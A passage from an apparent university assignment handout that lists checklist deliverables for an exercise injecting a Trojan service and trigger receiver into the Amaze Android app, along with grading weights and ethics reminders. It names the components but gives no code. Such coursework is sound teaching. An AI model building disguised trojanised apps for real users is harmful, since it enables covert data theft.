[All screenshots showing modifications]
```

**Deliverables:**
- Phase 2 Report (PDF): malware_injection_report.pdf
- Phase 3 Report (PDF): security_analysis_report.pdf

---

## FINAL CHECKLIST

Before submission, verify:

✅ **Files Created:**
- [ ] Modified APK (amaze_modified_signed.apk)
- [ ] Phase 1 Report (PDF)
- [ ] Phase 2 Report (PDF)
- [ ] Phase 3 Report (PDF)
- [ ] Source code files (TrojanService.java, TriggerReceiver.java)
- [ ] Modified AndroidManifest.xml
- [ ] Demonstration video (5-10 min MP4)
- [ ] Screenshot folder (6+ images)
- [ ] Ethical declaration signed

✅ **Report Quality:**
- [ ] Phase 1: 25% allocation
- [ ] Phase 2: 25% allocation
- [ ] Phase 3: 20% allocation
- [ ] Demonstration: 15% allocation
- [ ] Viva preparation: 10% allocation
- [ ] Code properly commented
- [ ] All modifications explained

✅ **Functionality:**
- [ ] APK installs without errors
- [ ] Original app works normally
- [ ] Malicious service activates
- [ ] Trigger works reliably
- [ ] Logs created proving execution
- [ ] No real data stolen
- [ ] All work is ethical

✅ **Viva Readiness:**
- [ ] Can explain reverse engineering
- [ ] Can explain each component
- [ ] Can run demo live
- [ ] Can show trigger activation
- [ ] Can explain code modifications
- [ ] Can discuss security implications
- [ ] Both group members prepared

---

## SUBMISSION DEADLINE
[To be announced]

### REMEMBER:
- This is for EDUCATION ONLY
- Unethical use has severe consequences
- Your learning comes from understanding HOW, not from doing HARM
- Success = Great learning + Ethical responsibility

Good luck! 🎓
